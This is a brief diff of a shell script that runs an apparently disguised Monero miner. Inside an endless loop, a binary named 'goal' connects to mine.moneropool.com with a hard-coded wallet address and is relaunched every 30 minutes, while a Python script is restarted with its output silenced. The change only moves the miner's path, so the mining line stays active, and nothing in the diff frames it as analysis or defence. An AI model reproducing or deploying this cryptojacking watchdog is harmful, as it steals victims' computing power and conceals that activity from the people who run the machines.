@@ -12,7 +12,7 @@ python /opt/code/origin.py &>/dev/null &
 
 while true; do 
     pgrep -f goal;
-    /bin/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &
+    /opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &
     pgrep -f origin;
     python /opt/code/origin.py &>/dev/null &
     sleep 1800;
